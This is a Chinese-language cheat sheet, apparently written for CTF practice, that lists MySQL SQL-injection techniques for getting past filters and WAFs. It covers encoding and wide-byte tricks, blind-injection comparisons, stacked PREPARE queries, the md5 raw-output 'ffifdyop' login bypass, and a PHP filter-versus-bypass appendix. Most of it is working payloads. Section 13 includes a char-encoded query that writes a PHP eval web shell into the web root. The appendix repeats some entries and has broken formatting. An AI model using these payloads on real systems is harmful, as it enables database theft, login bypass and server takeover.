##  1.注释符号绕过
```
--  注释内容
# 注释内容
/*注释内容*/
;
;%00
```
##  2.大小写绕过

常用于 waf的正则对大小写不敏感的情况，一般都是题目自己故意这样设计。
```
UniOn 
SeleCt
```
##  3.内联注释绕过

内联注释就是把一些特有的仅在MYSQL上的语句放在 /!../ 中，这样这些语句如果在其它数据库中是不会被执行，但在MYSQL中会执行。
```
 select * from cms_users where userid=1 union /*!select*/ 1,2,3;
```
##  4.双写绕过

在某一些简单的waf中，将关键字select等只使用replace()函数置换为空，这时候可以使用双写关键字绕过。例如select变成seleselectct，在经过waf的处理之后又变成select，达到绕过的要求。

##  5.编码绕过

如URLEncode编码，ASCII,HEX,unicode编码绕过：

### 对关键字进行两次url全编码：
```
1+and+1=2
1+%25%36%31%25%36%65%25%36%34+1=2 
```
### ascii编码绕过
```
Test 等价于CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)
```
### 16进制绕过：
```
select * from users where username = test1;
select * from users where username = 0x7465737431;
```
### unicode编码对部分符号的绕过：
```
单引号=> %u0037 %u02b9
空格=> %u0020 %uff00
左括号=> %u0028 %uff08
右括号=> %u0029 %uff09
```
##  6.<>大于小于号绕过

在sql盲注中，一般使用大小于号来判断ascii码值的大小来达到爆破的效果。
greatest(n1, n2, n3…):返回n中的最大值 或least(n1,n2,n3…):返回n中的最小值

```
select * from cms_users where userid=1 and greatest(ascii(substr(database(),1,1)),1)=99;
```
strcmp(str1,str2):

若所有的字符串均相同，则返回STRCMP()，若根据当前分类次序，第一个参数小于第二个，则返回 -1，其它情况返回 1
```
select * from cms_users where userid=1 and strcmp(ascii(substr(database(),0,1)),99);
```
in关键字
```
select * from cms_users where userid=1 and substr(database(),1,1) in ('c');
```
between a and b:范围在a-b之间（不包含b）
```
select * from cms_users where userid=1 and substr(database(),1,1) between 'a' and 'd';
```
##  7.空格绕过

一般绕过空格过滤的方法有以下几种方法来取代空格
```
//
()
回车(url编码中的%0a)
`(tap键上面的按钮)
tap
两个空格
```
##  8.对or and xor not 绕过
```
or = ||
and = &&
xor = | 或者 ^ # 异或,例如Select * from cms_users where userid=1^sleep(5);
not = !
```
##  9.对等号=绕过

不加通配符的like执行的效果和 = 一致，所以可以用来绕过。

正常加上通配符的like：
```
Select * from cms_users where username like "ad%";
```
不加上通配符的like可以用来取代=：
```
Select * from cms_users where username like "admin";
```
regexp:MySQL中使用 REGEXP 操作符来进行正则表达式匹配
```
Select * from cms_users where username REGEXP "admin";
```
使用大小于号来绕过
```
Select * from cms_users where userid>0 and userid<2;
```
<> 等价于 != ,所以在前面再加一个 ! 结果就是等号了
```
Select * from cms_users where !(username <> "admin");
```
##  10.对单引号的绕过

### 使用十六进制

会使用到引号的地方一般是在最后的where子句中。如下面的一条sql语句，这条语句就是一个简单的用来查选得到users表中所有字段的一条语句：
```
select column_name  from information_schema.tables where table_name="users"
```
这个时候如果引号被过滤了，那么上面的where子句就无法使用了。那么遇到这样的问题就要使用十六进制来处理这个问题了。
　　users的十六进制的字符串是7573657273。那么最后的sql语句就变为了：
```
select column_name  from information_schema.tables where table_name=0x7573657273
```
### 宽字节

在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字，一般有两种思路：

（1）%df 吃掉 \ 具体的方法是 urlencode(’) = %5c%27，我们在 %5c%27 前面添加 %df ，形成%df%5c%27 ，而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，%df%5c 就是一个汉字，%27 作为一个单独的 ’ 符号在外面：
```
id=-1%df%27union select 1,user(),3--+
```
（2）将 ’ 中的 \ 过滤掉，例如可以构造 %%5c%5c%27 ，后面的 %5c 会被前面的 %5c 注释掉。

一般产生宽字节注入的PHP函数：

1.replace（）：过滤 ’ \ ，将 ’ 转化为 ’ ，将 \ 转为 \，将 " 转为 " 。用思路一。

2.addslaches()：返回在预定义字符之前添加反斜杠（\）的字符串。预定义字符：’ , " , \ 。用思路一

（防御此漏洞，要将 mysql_query 设置为 binary 的方式）

##  11.对逗号的绕过

sql盲注时常用到以下的函数：
```sql
substr()
substr(string, pos, len):从pos开始，取长度为len的子串
substr(string, pos):从pos开始，取到string的最后

substring()
用法和substr()一样

mid()
用法和substr()一样，但是mid()是为了向下兼容VB6.0，已经过时，以上的几个函数的pos都是从1开始的

left()和right()
left(string, len)和right(string, len):分别是从左或从右取string中长度为len的子串

limit
limit pos len:在返回项中从pos开始去len个返回值，pos的从0开始

ascii()和char()
ascii(char):把char这个字符转为ascii码
char(ascii_int):和ascii()的作用相反，将ascii码转字符
```

对于substr()和mid()这两个方法可以使用from for 的方式来解决
```
select substr(database() from 1 for 1)='c';
```
使用join关键字来绕过
```
union select 1,2,3,4;
union select * from ((select 1)A join (select 2)B join (select 3)C join (select 4)D);
union select * from ((select 1)A join (select 2)B join (select 3)C join (select group_concat(user(),' ',database(),' ',@@datadir))D);
```
使用like关键字 适用于substr()等提取子串的函数中的逗号
```
select ascii(mid(user(),1,1))=80   #等价于
select user() like 'r%'
```
使用offset关键字
```
select * from cms_users limit 0,1;
# 等价于下面这条SQL语句
select * from cms_users limit 1 offset 0;
```
##  12.过滤函数绕过
```
sleep() -->benchmark()
select 12,23 and sleep(1);
参数可以是需要执行的次数和表达式。第一个参数是执行次数，第二个执行的表达式
select 12,23 and benchmark(10000000,1);

ascii()–>hex()、bin()
替代之后再使用对应的进制转string即可
group_concat()–>concat_ws()
select group_concat(“str1”,“str2”);
select concat_ws(“,”,“str1”,“str2”);

substr(),substring(),mid()可以相互取代, 取子串的函数还有left(),right()
user() --> @@user、datadir–>@@datadir
ord()–>ascii():这两个函数在处理英文时效果一样，但是处理中文等时不一致。
```

过滤了if函数：
```
if函数的判断语句
select if(substr(database(),1,1)='c',1,0);
IFNULL函数
select ifnull(substr(database(),1,1)='c',0);
case when then函数
select case substr(database(),1,1)='c' when 1 then 1 else 0 end;
```

##  13.堆叠注入时利用 MySql 预处理
在遇到堆叠注入时，如果select、rename、alter和handler等语句都被过滤的话，我们可以用MySql预处理语句配合concat拼接来执行sql语句拿flag。

PREPARE：准备一条SQL语句，并分配给这条SQL语句一个名字(hello)供之后调用

EXECUTE：执行命令

DEALLOCATE PREPARE：释放命令

SET：用于设置变量(@a)

```
1';sEt @a=concat("sel","ect flag from flag_here");PRepare hello from @a;execute hello;#
```
这里还用大小写简单绕了一下其他过滤

MySql 预处理配合十六进制绕过关键字
基本原理如下：

```
mysql> select hex('show databases');
+------------------------------+
| hex('show databases;')       |
+------------------------------+
| 73686F7720646174616261736573 |
+------------------------------+
1 row in set (0.01 sec)

mysql> set @b=0x73686F7720646174616261736573;
Query OK, 0 rows affected (0.01 sec)

mysql> prepare test from @b;
Query OK, 0 rows affected (0.02 sec)
Statement prepared

mysql> execute test;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| challenges         |
| mysql              |
| performance_schema |
| security           |
| test               |
+--------------------+
6 rows in set (0.02 sec)
```

即payload类似如下：
```
1';sEt @a=0x73686F7720646174616261736573;PRepare hello from @a;execute hello;#
```
MySql预处理配合字符串拼接绕过关键字
原理就是借助char()函数将ascii码转化为字符然后再使用concat()函数将字符连接起来，有了前面的基础这里应该很好理解了：
```
set @sql=concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(39),char(60),char(63),char(112),char(104),char(112),char(32),char(101),char(118),char(97),char(108),char(40),char(36),char(95),char(80),char(79),char(83),char(84),char(91),char(119),char(104),char(111),char(97),char(109),char(105),char(93),char(41),char(59),char(63),char(62),char(39),char(32),char(105),char(110),char(116),char(111),char(32),char(111),char(117),char(116),char(102),char(105),char(108),char(101),char(32),char(39),char(47),char(118),char(97),char(114),char(47),char(119),char(119),char(119),char(47),char(104),char(116),char(109),char(108),char(47),char(102),char(97),char(118),char(105),char(99),char(111),char(110),char(47),char(115),char(104),char(101),char(108),char(108),char(46),char(112),char(104),char(112),char(39),char(59));prepare s1 from @sql;execute s1;
```
也可以不用concat函数，直接用char函数也具有连接功能：
```
set @sql=char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,119,104,111,97,109,105,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59);prepare s1 from @sql;execute s1;
```
##  14.’“.md5($pass,true).”’ 登录绕过

很多站点为了安全都会利用这样的语句：
```
SELECT * FROM users WHERE password = '.md5($password,true).';
```
md5(string,true) 函数在指定了true的时候，是返回的原始 16 字符二进制格式，也就是说会返回这样子的字符串：'or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c：

![](https://img-blog.csdnimg.cn/2611a867b98e45589be9b4aacbab0061.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA56iL5bqP5ZGY5bGK55qE5bCP6I-c6bih,size_20,color_FFFFFF,t_70,g_se,x_16)

这不是普通的二进制字符串，而是 'or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c 这种，这样的话就会和前面的形成闭合，构成万能密码。

SELECT * FROM users WHERE password = ‘‘or’6…’
这就是永真的了，这就是一个万能密码了相当于 1’ or 1=1# 或 1’ or 1#。

但是我们思考一下为什么 6\xc9]\x99\xe9!r,\xf9\xedb\x1c 的布尔值是true呢？

在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数（这类似于PHP的弱类型）。要注意的是这种情况是必须要有单引号括起来的，比如 password=‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password=‘xxx’ or 1 ，也就相当于 password=‘xxx’ or true，所以返回值就是true。这里不只是1开头，只要是数字开头都是可以的。当然如果只有数字的话，就不需要单引号，比如 password=‘xxx’ or 1，那么返回值也是 true。（xxx指代任意字符）

接下来就是找到这样子的字符串，这里给出两个吧。

```
ffifdyop：
content: ffifdyop
hex: 276f722736c95d99e921722cf9ed621c
raw: 'or'6\xc9]\x99\xe9!r,\xf9\xedb\x1c
string: 'or'6]!r,b
129581926211651571912466741651878684928：
```

```
129581926211651571912466741651878684928：
content: 129581926211651571912466741651878684928
hex: 06da5430449f8f6f23dfc1276f722738
raw: \x06\xdaT0D\x9f\x8fo#\xdf\xc1'or'8
string: T0Do#'or'8
```

##  附录 PHP中一些常见的过滤方法及绕过方式

过滤关键字   and or
```
php代码   preg_match('/(and|or)/i',$id)
会过滤的攻击代码    1 or 1=1 1 and 1=1
绕过方式    1 || 1=1 1 && 1=1
```
过滤关键字   and or union
```
php代码   preg_match('/(and|or|union)/i',$id)
会过滤的攻击代码    union select user,password from users
绕过方式    1 && (select user from users where userid=1)='admin'
```
过滤关键字   and or union where
```
php代码   preg_match('/(and|or|union|where)/i',$id)
会过滤的攻击代码    1 && (select user from users where user_id = 1) = 'admin'
绕过方式    1 && (select user from users limit 1) = 'admin'
```
过滤关键字   and or union where
```
php代码   preg_match('/(and|or|union|where)/i',$id)
会过滤的攻击代码    1 && (select user from users where user_id = 1) = 'admin'
绕过方式    1 && (select user from users limit 1) = 'admin'
```
过滤关键字   and, or, union, where, limit
```
php代码   preg_match('/(and|or|union|where|limit)/i', $id)
会过滤的攻击代码    1 && (select user from users limit 1) = 'admin'
绕过方式    1 && (select user from users group by user_id having user_id = 1) = 'admin'#user_id聚合中user_id为1的user为admin
```
过滤关键字   and, or, union, where, limit, group by
```
php代码   preg_match('/(and|or|union|where|limit|group by)/i', $id)
会过滤的攻击代码    1 && (select user from users group by user_id having user_id = 1) = 'admin'
绕过方式    1 && (select substr(group_concat(user_id),1,1) user from users ) = 1
```
过滤关键字   and, or, union, where, limit, group by, select
```
php代码   preg_match('/(and|or|union|where|limit|group by|select)/i', $id)
会过滤的攻击代码    1 && (select substr(gruop_concat(user_id),1,1) user from users) = 1
绕过方式    1 && substr(user,1,1) = 'a'
```
过滤关键字   and, or, union, where, limit, group by, select, '
```
php代码   preg_match('/(and|or|union|where|limit|group by|select|\')/i', $id)
会过滤的攻击代码    1 && (select substr(gruop_concat(user_id),1,1) user from users) = 1
绕过方式    1 && user_id is not null 1 && substr(user,1,1) = 0x61 1 && substr(user,1,1) = unhex(61)
```
过滤关键字   and, or, union, where, limit, group by, select, ', hex
```
php代码   preg_match('/(and|or|union|where|limit|group by|select|\'|hex)/i', $id)
会过滤的攻击代码    1 && substr(user,1,1) = unhex(61)
绕过方式    1 && substr(user,1,1) = lower(conv(11,10,16)) #十进制的11转化为十六进制，并小写。
```
过滤关键字   and, or, union, where, limit, group by, select, ', hex,
``` substr
php代码   preg_match('/(and|or|union|where|limit|group by|select|\'|hex|substr)/i', $id)
会过滤的攻击代码    1 && substr(user,1,1) = lower(conv(11,10,16))/td>
绕过方式    1 && lpad(user,7,1)
```
过滤关键字   and, or, union, where, limit, group by, select, ', hex, 
```substr, 空格
php代码   preg_match('/(and|or|union|where|limit|group by|select|\'|hex|substr|\s)/i', $id)
会过滤的攻击代码    1 && lpad(user,7,1)/td>
绕过方式    1%0b||%0blpad(user,7,1)
```
过滤关键字   and or union where
```
php代码   preg_match('/(and|or|union|where)/i',$id)
会过滤的攻击代码    1 || (select user from users where user_id = 1) = 'admin'
绕过方式    1 || (select user from users limit 1) = 'admin'
```